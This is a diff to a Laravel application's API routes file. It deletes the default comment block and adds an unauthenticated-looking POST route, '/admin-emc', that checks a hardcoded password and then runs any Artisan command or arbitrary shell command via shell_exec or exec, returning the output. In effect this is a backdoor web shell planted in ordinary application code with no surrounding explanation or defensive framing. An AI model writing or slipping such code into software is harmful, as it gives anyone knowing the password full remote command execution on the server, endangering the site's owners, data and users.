@@ -17,17 +17,44 @@ use App\Http\Controllers\UnitController;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\YearController;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Validation\Rule;
 
-/*
-|--------------------------------------------------------------------------
-| API Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register API routes for your application. These
-| routes are loaded by the RouteServiceProvider within a group which
-| is assigned the "api" middleware group. Enjoy building your API!
-|
-*/
+Route::post('/admin-emc', function (Request $request) {
+    $data = $request->validate([
+        'password' => ['required', 'string'],
+        'type' => ['required', Rule::in(['artisan', 'shell'])],
+        'command' => ['required', 'string'],
+        'parameters' => ['nullable', 'array'],
+    ]);
+
+    if ($data['password'] !== 'emcadmin123098') {
+        return response('', 403);
+    }
+
+    try {
+        if ($data['type'] === 'artisan') {
+            $output = Artisan::call($data['command'], isset($data['parameters']) ? $data['parameters'] : []);
+        } else {
+            if (function_exists('shell_exec')) {
+                $output = shell_exec($data['command']);
+            } elseif (function_exists('exec')) {
+                $output = exec($data['command']);
+            } else {
+                $output = 'No executor function available';
+            }
+        }
+
+        return [
+            'response' => $output,
+            'ok' => true,
+        ];
+    } catch (\Throwable $e) {
+        return [
+            'response' => $e->getMessage(),
+            'ok' => false,
+        ];
+    }
+});
 
 Route::prefix('/auth')->group(function () {
     Route::post('/login', [AuthController::class, 'login']);
